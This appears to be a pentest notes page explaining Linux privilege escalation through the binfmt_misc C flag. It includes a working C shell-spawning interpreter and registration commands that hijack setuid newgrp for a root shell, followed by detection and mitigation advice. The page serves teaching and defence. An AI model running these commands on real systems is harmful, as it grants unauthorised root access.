---
title: binfmt_misc — registering interpreters and abusing flag C
tags: [linux, privesc, binfmt_misc, capabilities, setuid]
---

# binfmt_misc: when the kernel runs your interpreter

**English** | [🇪🇸 Español](binfmt-misc.md)

## 1. What it is

`binfmt_misc` maps an extension or *magic bytes* to an interpreter. When a matching file is executed, the kernel launches the interpreter with the file as an argument, no shebang needed.

```bash
mount | grep binfmt
ls /proc/sys/fs/binfmt_misc/
cat /proc/sys/fs/binfmt_misc/status
```

Registration is written to `/proc/sys/fs/binfmt_misc/register` in this format:

```text
:name:type:offset:magic:mask:interpreter:flags
```

- `type`: `M` for magic, `E` for extension.
- `offset`: bytes to skip before the magic (ignored for `E`).
- `magic`: signature or extension.
- `interpreter`: program to run.
- `flags`: `P` (original argv[0]), `O` (pass fd), `C` (program credentials), `F` (open at registration).

## 2. The C flag

Without `C`, the interpreter runs with the invoking user's credentials. With `C`, the kernel applies the **matching binary's** credentials. If the binary is setuid root, the interpreter runs as root.

```bash
# interpreter that launches bash
cat > /dev/shm/h.c <<'EOF'
#include <unistd.h>
int main(void) {
    setresuid(0, 0, 0);
    char *argv[] = {"/bin/bash", "-p", NULL};
    execve(argv[0], argv, NULL);
    return 1;
}
EOF
gcc -o /dev/shm/h /dev/shm/h.c
```

Register a rule matching the first bytes of a known setuid binary:

```bash
MAGIC=$(head -c 30 /usr/bin/newgrp | xxd -p | sed 's/../\\x&/g')
echo ":x:M::$MAGIC::/dev/shm/h:C" | tee /proc/sys/fs/binfmt_misc/register
newgrp
```

If the user cannot write `register`, look for a helper with `cap_dac_override` or a service that does it for them (like `reg_helper` on Retired).

## 3. Extension variant

```bash
ln -s /usr/bin/newgrp /dev/shm/x.sploit
echo ':sploit:E::sploit::/dev/shm/h:C' | tee /proc/sys/fs/binfmt_misc/register
/dev/shm/x.sploit
```

The extension matches the symlink; the underlying binary remains setuid.

## 4. Detection

- Writes to `/proc/sys/fs/binfmt_misc/register` by processes other than `systemd-binfmt`.
- New entries in `/proc/sys/fs/binfmt_misc/` with interpreters in `/tmp`, `/dev/shm` or `/home`.
- `newgrp`, `su` or `mount` executed from unusual paths.
- Processes with `cap_dac_override` writing to the register file.
- `getcap -r / 2>/dev/null` to inventory capabilities.

## 5. Mitigation

- Mount `/proc/sys/fs/binfmt_misc` without write access for users.
- Do not give `cap_dac_override` to helpers that write kernel files.
- Review `systemd-binfmt` units and persistent entries in `/etc/binfmt.d/`.
- Audit setuid and capabilities; remove unnecessary ones.
- Monitor interpreter creation in temporary directories.

## 6. References

- <https://man7.org/linux/man-pages/man5/binfmt_misc.5.html>
- <https://man7.org/linux/man-pages/man7/capabilities.7.html>
- <https://0xdf.gitlab.io/2022/08/13/htb-retired.html>
